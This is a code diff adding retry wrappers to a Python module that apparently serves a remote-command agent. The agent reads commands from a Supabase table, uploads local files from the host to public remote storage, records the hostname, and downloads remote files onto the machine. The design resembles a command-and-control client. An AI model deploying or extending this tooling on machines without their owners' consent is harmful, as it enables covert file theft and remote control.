@@ -4,6 +4,7 @@ import requests
 from supabase import create_client, Client
 from .config import SUPABASE_URL, SUPABASE_KEY, bucket_name
 from .system_info import get_system_info
+from .retry_utils import with_retries
 
 # Initialize Supabase client
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
@@ -33,9 +34,9 @@ def handle_download_command(command_text, username, supabase: Client):
             file_content = f.read()
 
         # Upload the file to Supabase storage
-        response = supabase.storage.from_(bucket_name).upload(
+        response = with_retries(lambda: supabase.storage.from_(bucket_name).upload(
             storage_path, file_content, file_options={"content_type": mimetype}
-        )
+        ))
 
         if response.status_code in [200, 201]:
             # Construct the public URL for the uploaded file
@@ -43,14 +44,14 @@ def handle_download_command(command_text, username, supabase: Client):
 
             # Insert download record into the database
             hostname, _, _ = get_system_info()
-            supabase.table("downloads").insert({
+            with_retries(lambda: supabase.table("downloads").insert({
                 "hostname": hostname,
                 "local_path": file_path,
                 "remote_path": storage_path,
                 "file_url": file_url,
                 "username": username,
                 "status": "Completed"
-            }).execute()
+            }).execute())
 
             # Update the py2 table to mark the command as completed with output
             update_command_status(command_text, "Completed", f"File uploaded and available at {file_url}")
@@ -75,7 +76,7 @@ def update_command_status(command_text, status, output=None):
         data = {"status": status}
         if output:
             data["output"] = output
-        supabase.table("py2").update(data).eq("command", command_text).execute()
+        with_retries(lambda: supabase.table("py2").update(data).eq("command", command_text).execute())
     except Exception as e:
         print(f"Failed to update command status: {str(e)}")
 
@@ -90,7 +91,7 @@ def download_from_supabase(file_url, remote_path, supabase_key, supabase: Client
     if local_directory and not os.path.exists(local_directory):
         os.makedirs(local_directory, exist_ok=True)
 
-    response = requests.get(file_url, headers=headers)
+    response = with_retries(lambda: requests.get(file_url, headers=headers))
     if response.status_code == 200:
         with open(remote_path, "wb") as file:
             file.write(response.content)
@@ -100,7 +101,7 @@ def download_from_supabase(file_url, remote_path, supabase_key, supabase: Client
 
 def fetch_pending_uploads(supabase: Client):
     """Fetches pending uploads from the 'uploads' table."""
-    response = supabase.table("uploads").select("*").eq("status", "pending").execute()
+    response = with_retries(lambda: supabase.table("uploads").select("*").eq("status", "pending").execute())
     return response
 
 def handle_upload_command(command_text, username, supabase: Client):
@@ -118,19 +119,21 @@ def handle_upload_command(command_text, username, supabase: Client):
         mimetype, _ = mimetypes.guess_type(local_path)
 
         with open(local_path, "rb") as f:
-            response = supabase.storage.from_(bucket_name).upload(remote_path, f, file_options={"content_type": mimetype})
+            response = with_retries(lambda: supabase.storage.from_(bucket_name).upload(
+                remote_path, f, file_options={"content_type": mimetype}
+            ))
 
         if response.status_code in [200, 201]:
             # Construct public URL for the uploaded file
             file_url = get_public_url(bucket_name, remote_path)
             # Update the uploads table
-            supabase.table("uploads").insert({
+            with_retries(lambda: supabase.table("uploads").insert({
                 "local_path": local_path,
                 "remote_path": remote_path,
                 "file_url": file_url,
                 "username": username,
                 "status": "pending"  # You might want to change the status later
-            }).execute()
+            }).execute())
             return "Completed", f"File uploaded to {file_url}"
         else:
             return "Failed", f"Upload failed with status code: {response.status_code}"
